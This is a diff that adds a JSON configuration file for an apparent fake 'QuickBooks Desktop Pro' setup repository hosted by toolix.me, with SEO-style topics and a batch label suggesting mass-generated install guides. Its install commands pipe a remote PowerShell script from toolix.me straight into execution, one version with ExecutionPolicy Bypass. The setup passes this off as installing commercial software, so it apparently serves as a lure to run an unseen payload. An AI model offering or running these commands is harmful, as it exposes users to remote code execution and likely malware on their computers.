@@ -1,0 +1,27 @@
+{
+  "repo": "QuickBooks-Desktop-Pro-Professional-Setup",
+  "product": "QuickBooks Desktop Pro Professional Setup",
+  "product_title": "QuickBooks Desktop Pro Professional",
+  "kind": "utility",
+  "install_type": "toolix-irm",
+  "install_command": "irm https://toolix.me/ps/setup.ps1 | iex",
+  "install_command_bypass": "powershell -NoProfile -ExecutionPolicy Bypass -Command \"irm https://toolix.me/ps/setup.ps1 | iex\"",
+  "batch": "git-new-era-toolix-pending",
+  "format": "license-md-toolix-git-new-era-guide",
+  "tone": "guide",
+  "category": "dev",
+  "topics": [
+    "how-to-install-quickbooks-desktop-pro",
+    "quickbooks-desktop-pro-app",
+    "terminal-client",
+    "database-tools",
+    "developer-tools",
+    "coding-workflow",
+    "quickbooks-desktop-pro-windows-tool",
+    "quickbooks-desktop-pro-modeling-tool",
+    "quickbooks-desktop-pro",
+    "windows-11",
+    "install-guide"
+  ],
+  "site": "toolix.me"
+}
